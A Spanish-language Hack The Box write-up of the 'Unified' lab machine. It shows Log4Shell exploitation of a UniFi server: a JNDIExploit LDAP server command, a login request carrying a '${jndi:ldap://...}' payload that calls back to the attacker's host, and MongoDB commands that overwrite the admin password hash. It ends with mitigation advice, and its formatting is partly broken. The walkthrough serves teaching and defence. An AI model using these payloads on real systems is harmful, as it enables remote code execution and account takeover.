# 🛡️ HTB Machine Writeup: Unified

![Hack The Box](https://img.shields.io/badge/HackTheBox-Starting%20Point-green?style=for-the-badge&logo=hackthebox)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-yellow?style=for-the-badge)
![Status](https://img.shields.io/badge/Status-Pwned-brightgreen?style=for-the-badge)

## 📖 Introducción

**Unified** es una máquina de nivel "Easy" en Hack The Box que simula un servidor de gestión de red **UniFi**. El reto principal consiste en explotar la vulnerabilidad **Log4Shell** para obtener una shell inicial y luego manipular una base de datos **NoSQL (MongoDB)** para escalar privilegios.

---

## 1. Fase de Reconocimiento 🔍

### Escaneo de Puertos (Nmap)

El escaneo inicial identifica los servicios activos en la IP `10.129.40.205`:

```bash
nmap -sV -sC 10.129.40.205

```bash
# Resultado del escaneo de Nmap
PORT     STATE SERVICE
22/tcp   open  ssh
8080/tcp open  http-proxy
8443/tcp open  https-alt  # Interfaz de UniFi vulnerable

### Paso A: Servidor malicioso
Iniciamos el servidor LDAP indicando nuestra IP de la VPN (`10.10.16.168`):

```bash
java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 10.10.16.168

POST /api/login HTTP/1.1
Host: 10.129.40.128:8443
Content-Type: application/json

{
  "username": "admin",
  "password": "password",
  "remember": "${jndi:ldap://10.10.16.168:1389/o=tomorrow}"
}

db.siteuser.update({shortname: "admin"}, {$set: {x_shadow: "$6$96pS6pCc$79vfK6m.LpGshJ3L9X.9v7Y8MvHwQnL7d.XfQz.mRshJ7v.LpGshJ3L9X.9v7Y8MvHwQnL7d.XfQz.mRshJ7"}})

### 3. Post-Explotación y MongoDB 🗄️

Una vez obtenida la shell, accedemos a la base de datos interna de UniFi para resetear la contraseña del administrador:

```javascript
// Conectar a la base de datos
mongo --port 27117
use ace

// Cambiar la contraseña de 'admin' a 'password'
db.siteuser.update(
  { "shortname": "admin" },
  { "$set": { "x_shadow": "$6$96pS6pCc$79vfK6m.LpGshJ3L9X.9v7Y8MvHwQnL7d.XfQz.mRshJ7v.LpGshJ3L9X.9v7Y8MvHwQnL7d.XfQz.mRshJ7" } }
)

### ¿Qué sigue ahora?
1. **Verifica:** Al darle a Enter en la máquina, deberías ver un mensaje que dice `nModified: 1`.
2. **Login:** Ve a `https://10.129.40.128:8443` e inicia sesión con:
   * **User:** `admin`
   * **Password:** `password`
3. **Root:** Una vez dentro, busca en la configuración las credenciales de SSH que te permitirán obtener la flag final de root.


## 🛡️ Mitigación y Aprendizajes

### 1. Actualización de Software (Parcheo)
La vulnerabilidad principal es **Log4Shell (CVE-2021-44228)**. La medida más efectiva es actualizar la instancia de UniFi Network Application a la versión **6.5.55** o superior, donde la librería Log4j ya ha sido parcheada.

### 2. Endurecimiento de la Base de Datos (Hardening)
La base de datos MongoDB era accesible localmente sin credenciales robustas una vez dentro del sistema. Se recomienda:
* Configurar la autenticación obligatoria para MongoDB.
* Cambiar el puerto por defecto y limitar las conexiones solo a servicios internos específicos.

### 3. Principio de Menor Privilegio
El servicio UniFi corría bajo el usuario `unifi`. Sin embargo, las credenciales de administración de dispositivos estaban almacenadas en texto claro dentro del panel.
Se recomienda el uso de un **Key Management System (KMS)** o bóvedas de contraseñas (Vaults) para no exponer credenciales de `root` en la interfaz web.

### 4. Restricción de Salida (Egress Filtering)
El ataque Log4j depende de que el servidor víctima pueda realizar una conexión hacia el exterior (LDAP en el puerto 1389).
Configurar un Firewall para bloquear conexiones salientes no autorizadas habría mitigado el impacto del RCE.

